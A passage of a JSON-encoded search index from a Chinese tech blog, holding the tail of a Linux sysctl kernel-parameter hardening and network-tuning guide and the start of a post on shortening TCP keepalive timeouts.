class=\"na\"\u003enet.ipv4.conf.default.log_martians\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# No source routed packets here\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.accept_source_route\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.accept_source_route\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn on reverse path filtering\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.rp_filter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.rp_filter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Make sure no one can alter the routing tables\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.accept_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.accept_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.secure_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.secure_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Don\u0026#39;t act as a router\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.ip_forward\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.all.send_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.conf.default.send_redirects\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Number of times SYNACKs for passive TCP connection.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_synack_retries\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Allowed local port range\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.ip_local_port_range\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1024 65000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Protect Against TCP Time-Wait\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_rfc1337\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Decrease the time default value for tcp_fin_timeout connection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_fin_timeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Decrease the time default value for connections to keep alive\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_time\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_probes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_keepalive_intvl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e15\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This means that the keepalive process waits 300 seconds for socket \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# activity before sending the first keepalive probe, and then resend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# it every 15 seconds. If no ACK response is received for 5 consecutive \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# times (75s in this case), the connection is marked as broken.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e### TUNING NETWORK PERFORMANCE ###\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Disable IPv6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.all.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.default.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv6.conf.lo.disable_ipv6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Default Socket Receive Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.rmem_default\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e31457280\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Maximum Socket Receive Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.rmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e12582912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Default Socket Send Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.wmem_default\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e31457280\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Maximum Socket Send Buffer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.wmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e12582912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase number of incoming connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.somaxconn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e5000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase number of incoming connections backlog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.netdev_max_backlog\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable TCP window scaling\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_window_scaling\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the maximum amount of option memory buffers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.core.optmem_max\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e25165824\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the maximum total buffer-space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# This is measured in units of pages (4096 bytes)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_mem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536 131072 262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_mem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e65536 131072 262144\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the read-buffer space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_rmem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192 87380 16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_rmem_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the write-buffer-space allocatable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_wmem\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e8192 65536 16777216\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.udp_wmem_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e16384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Increase the tcp-time-wait buckets pool size to prevent simple DOS attacks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_tw_buckets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1800000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# TIME_WAIT socket policy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Note: if both enabled then disable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# net.ipv4.tcp_timestamps for servers \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# behind NAT to prevent dropped incoming connections\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_tw_recycle = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_tw_reuse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Enable TCP MTU probing (in case of Jumbo Frames enabled)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_mtu_probing = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Speedup retrans (Google recommended)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_slow_start_after_idle\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_early_retrans\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Conntrack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 288bytes x 131072 = 37748736 (~38MB) max memory usage\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.netfilter.nf_conntrack_max = 131072\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.netfilter.nf_conntrack_tcp_loose = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#TCP的直接拥塞通告(tcp_ecn)关掉\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_ecn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.route.gc_timeout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#设定系统中最多允许在多少TCP套接字不被关联到任何一个用户文件句柄上。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#如果超过这个数字，没有与用户文件句柄关联的TCP 套接字将立即被复位\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#防简单Dos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003enet.ipv4.tcp_max_orphans\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e655360\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# NOTE: Enable this if machine support it\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -- 10gbe tuning from Intel ixgb driver README -- #\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# turn off selective ACK and timestamps\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_sack = 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#net.ipv4.tcp_timestamps = 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e** 注意，net.ipv4.tcp_tw_recycle 不要打开，在 NAT 环境中会出错，而且在 K8S 中也会因 NAT 导致 pod 出错，切记！！！**\u003c/p\u003e","title":"Linux内核sysctl内核参数优化"},{"content":"Custom Configuration of TCP Socket Keep-Alive Timeouts 这是个古老的话题，我们在机器的优化中，需要设置 TCP Socket 的 Timeout 参数\n用来加快 TCP 关闭无用闲置连接的时间\nLinux 内核中有三个缺省参数:\ntcp_keepalive_time 缺省是 7200 秒 tcp_keepalive_probes 缺省是 9 tcp_keepalive_intvl 缺省是 75 秒 处理流程如下：\n一、客户端打开一个 TCP socket 连接，开始跟服务器通讯\n二、如果这条 socket 连接空闲没有任何数据传输，静默了 tcp_keepalive_time 秒后，那么客户端会主动发送一个空的 ACK 包到服务器\n三、那么，根据服务器是否回应了一个相应的 ACK 包来判断\nACK 未回应 等待 tcp_keepalive_intvl 秒，然后再发一个 ACK 包 重复以上等待并发送 ACK 包的过程，直到次数等于 tcp_keepalive_probes 如果第2步做完还收不到任何回应，发送一个 RST 包并关闭连接 回应了: 回到上述第二步 那么缺省情况下，7200+75×9，一个没有任何数据传输的 socket 才会被关闭，大概是2小时11分钟。\n这个时间太长了。需要优化一下：\nnet.ipv4.tcp_keepalive_time = 300 net.ipv4.tcp_keepalive_probes = 5 net.ipv4.tcp_keepalive_intvl = 15 上面的时间是 300 + 5x15，大概是6分钟，大大缩短释放空闲 socket 的时间\n","permalink":"https://rendoumi.com/posts/20211102-tcp_keealive/","summary":"\u003ch4 id=\"custom-configuration-of-tcp-socket-keep-alive-timeouts\"\u003eCustom Configuration of TCP Socket Keep-Alive Timeouts\u003c/h4\u003e\n\u003cp\u003e这是个古老的话题，我们在机器的优化中，需要设置 TCP Socket 的 Timeout 参数\u003c/p\u003e\n\u003cp\u003e用来加快 TCP 关闭无用闲置连接的时间\u003c/p\u003e\n\u003cp\u003eLinux 内核中有三个缺省参数:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-plaintext\" data-lang=\"plaintext\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tcp_keepalive_time\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e缺省是 7200 